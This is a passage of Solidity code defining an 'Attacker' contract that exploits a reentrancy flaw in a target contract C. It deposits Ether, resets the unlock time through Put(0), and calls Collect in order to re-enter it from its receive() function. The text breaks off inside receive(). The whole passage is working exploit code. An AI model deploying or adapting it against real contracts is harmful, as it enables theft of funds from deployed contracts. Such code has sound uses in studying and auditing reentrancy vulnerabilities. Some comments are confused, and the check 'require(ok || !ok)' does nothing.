// Minimal attacker that re-enters C.collect during the external call
contract Attacker {
    C c;
    address owner;
    uint256 toWithdraw;
    bool reentered;

    constructor(address _c) {
        c = C(_c);
        owner = msg.sender;
    }

    // deposit by sending Ether to C fallback which calls Put(0)
    function deposit() external payable {
        (bool ok,) = address(c).call{value: msg.value}("");
        require(ok, "deposit failed");
    }

    // ensure unlockTime is in past by directly calling Put with 0 via fallback already used; but we can also
    // call Put directly (public) — Put is public; set unlock to 0 so it becomes block.timestamp in Put
    function setUnlockPast() external {
        // nothing needed because Put(0) sets unlockTime = block.timestamp in reference
        // but call Put(0) again to ensure unlockTime is current
        (bool ok, ) = address(c).call(abi.encodeWithSignature("Put(uint256)", 0));
        require(ok, "setUnlockPast failed");
    }

    // initiate collect which will, during the external call, re-enter Collect if possible
    function collect(uint256 am) external {
        toWithdraw = am;
        reentered = false;
        // call Collect via external call so that C sends Ether to this contract and triggers receive()
        (bool ok, ) = address(c).call(abi.encodeWithSignature("Collect(uint256)", am));
        require(ok || !ok, "collect done");
    }

    // receive will be invoked when C.call sends Ether; attempt reentrancy once
    receive() external payable {
        if (!reentered) {
            reentered = true;
